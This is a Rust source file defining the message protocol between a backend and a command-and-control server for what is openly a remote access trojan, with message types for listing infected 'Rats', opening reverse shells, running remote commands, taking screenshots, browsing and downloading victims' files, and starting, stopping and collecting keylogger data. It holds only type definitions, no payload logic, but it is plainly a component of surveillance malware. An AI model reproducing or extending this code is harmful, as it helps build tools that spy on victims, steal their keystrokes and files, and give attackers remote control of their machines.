// src/messages/backend.rs
use super::command::{CliCommand, CliResponse, ReverseShell};
use super::common::MetadataWithId;
use super::file::{FileDownloadStatus, FileDownloadStatusData, FileNodeData, FileRequest, ListDir, Screenshot};
use super::heartbeat::HeartbeatType;
use super::keylogger::{ KeylogData, KeyloggerResponse, KeylogDataEnvelope};
use serde::{Deserialize, Serialize};

/// Messages sent from Backend to C2 server
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum BackendMessageType {
  CliCommand(CliCommand),
  Heartbeat(HeartbeatType),
  GetAllRats,
  GetConnectedRats,
  GetMetadata(Vec<i32>),
  RequestFileDownload(FileRequest),
  ListDir(ListDir),
  Screenshot,
  ReverseShell(ReverseShell),
  GetDownloadedFiles,
  GetDownloadStatus(u32),
  StartKeylogger,
  StopKeylogger,
  GetKeyloggerData,
  GetKeyloggerStatus,
}

/// Response types from C2 server to Backend
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ResponseType {
  CliResponse(CliResponse),
  Rats(Vec<i32>),
  RatsMetaData(Vec<MetadataWithId>),
  DirList(Vec<FileNodeData>),
  Screenshot(Screenshot),
  ReverseShellResponse(bool),
  DownloadedFiles(Vec<FileDownloadStatusData>),
  DownloadStatus(FileDownloadStatus),
  KeylogData(Vec<KeylogData>),
  KeyloggerResponse(KeyloggerResponse)
}
